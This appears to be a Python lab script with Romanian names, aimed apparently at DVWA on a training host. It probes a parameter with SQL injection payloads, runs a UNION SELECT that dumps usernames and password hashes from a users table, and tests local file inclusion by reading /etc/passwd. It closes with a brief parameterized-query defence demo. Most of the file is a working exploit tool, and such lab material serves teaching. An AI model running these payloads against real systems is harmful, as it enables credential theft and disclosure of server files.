import argparse
import re
import sqlite3

from arsenal.web.client import cere

PAYLOADS = ["1' OR '1'='1", "1' OR 1=1-- -", "1' AND '1'='2"]


def verifica_sqli(url, id_normal="1"):
    normal = cere(url, params={"id": id_normal, "Submit": "Submit"})
    print("normal:", len(normal.text), "octeti")
    for pl in PAYLOADS:
        r = cere(url, params={"id": pl, "Submit": "Submit"})
        if len(r.text) > len(normal.text):
            print(repr(pl), len(r.text), "posibil SQLi")
        else:
            print(repr(pl), len(r.text), "-")
    return normal


def extrage_union(url):
    pl = "1' UNION SELECT user, password FROM users-- -"
    r = cere(url, params={"id": pl, "Submit": "Submit"})
    perechi = re.findall(r"([a-f0-9]{32})", r.text)
    print("hash-uri:", perechi)


def verifica_lfi(url):
    pl = "../../../../etc/passwd"
    r = cere(url, params={"page": pl})
    if "root:" in r.text:
        print("LFI confirmat")
        for linie in r.text.splitlines()[:3]:
            print(linie)
    else:
        print("LFI neconfirmat")


def demo_aparare():
    db = sqlite3.connect(":memory:")
    db.execute("CREATE TABLE u(nume, parola)")
    db.execute("INSERT INTO u VALUES ('ana', 'x')")
    rau = "' OR '1'='1"
    q = "SELECT * FROM u WHERE nume = ?"
    print("interogare parametrizata:", db.execute(q, (rau,)).fetchall())


def main():
    p = argparse.ArgumentParser(description="SQLi si LFI pe tinta de laborator.")
    p.add_argument("tinta", nargs="?", default="http://tinta-lab")
    p.add_argument("--sqli", default=None)
    p.add_argument("--lfi", default=None)
    a = p.parse_args()

    baza = a.tinta.rstrip("/")
    url_sqli = a.sqli or baza + "/vulnerabilities/sqli/"
    url_lfi = a.lfi or baza + "/vulnerabilities/fi/"

    try:
        verifica_sqli(url_sqli)
        extrage_union(url_sqli)
        verifica_lfi(url_lfi)
    except Exception as e:
        print("nu am putut atinge tinta:", e)
        print("ruleaza scriptul in laborator si da IP-ul ca argument")

    demo_aparare()


if __name__ == "__main__":
    main()
